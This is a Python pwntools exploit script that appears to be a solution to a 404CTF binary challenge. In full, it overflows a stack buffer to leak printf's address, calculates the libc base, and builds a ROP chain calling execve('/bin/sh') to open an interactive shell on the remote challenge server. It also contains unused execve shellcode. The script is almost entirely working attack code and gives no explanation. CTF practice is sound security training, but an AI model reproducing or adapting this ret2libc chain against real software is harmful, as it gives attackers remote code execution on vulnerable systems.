from pwn import *

hex_pattern = r'0[xX][0-9a-fA-F]+'

exe = ELF("./chall")
libc = ELF("./libc.so.6")
debug_addr = exe.symbols["debug_info"]
command_addr = exe.symbols["take_command"]
execve = libc.symbols['execve']
printf = libc.symbols['printf']

rop = ROP("./libc.so.6")

context.binary = exe

def conn():
    if args.LOCAL:
        r = process([exe.path])
        if args.DEBUG:
            gdb.attach(r)
    else:
        r = remote("challenges.404ctf.fr", 32465)
    return r

def generate_shellcode():
    shellcode_asm = """
        xor     rdx, rdx
        movabs  rbx, 0x68732f6e69622fff
        shr     rbx, 8
        push    rbx
        mov     rdi, rsp
        xor     rax, rax
        push    rax
        push    rdi
        mov     rsi, rsp
        mov     al, 0x3b
        syscall 
        push    1
        pop     rdi
        push    0x3c
        pop     rax
        syscall 
	"""
    shellcode = asm(shellcode_asm, bits=64)
    return shellcode



def leak_printf_addr(r: process):
    offset = 0x108
    payload = b"A" * offset
    payload += p64(debug_addr)
    payload += p64(command_addr)
    
    r.send_raw(payload + b"\n")
    r.recvuntil(b"printf")    
    res = r.recvline().decode()
    
    printf = re.search(hex_pattern,res)[0]
    
    return printf


    
def main():
    offset = 0x108
    printf_offset = libc.symbols['printf']
    execve_offset = libc.symbols['execve']

    r = conn()
    # pause()

    printf_addr = int(leak_printf_addr(r), 16)
    print("Leaked printf address:", hex(printf_addr))

    libc_base = printf_addr - printf_offset
    execve_addr = libc_base + execve_offset
    binsh_addr = libc_base + next(libc.search(b"/bin/sh"))
    print("Libc base:", hex(libc_base))
    print("execve:", hex(execve_addr))
    print("/bin/sh:", hex(binsh_addr))

    rop = ROP(libc)
    pop_rdi = rop.find_gadget(['pop rdi', 'ret']).address + libc_base
    pop_rsi = rop.find_gadget(['pop rsi', 'ret']).address + libc_base

    payload = b"A" * offset
    payload += p64(pop_rdi)
    payload += p64(binsh_addr)
    payload += p64(pop_rsi)
    payload += p64(0)
    payload += p64(execve_addr)

    r.sendline(payload)
    r.interactive()


if __name__ == "__main__":
    main()
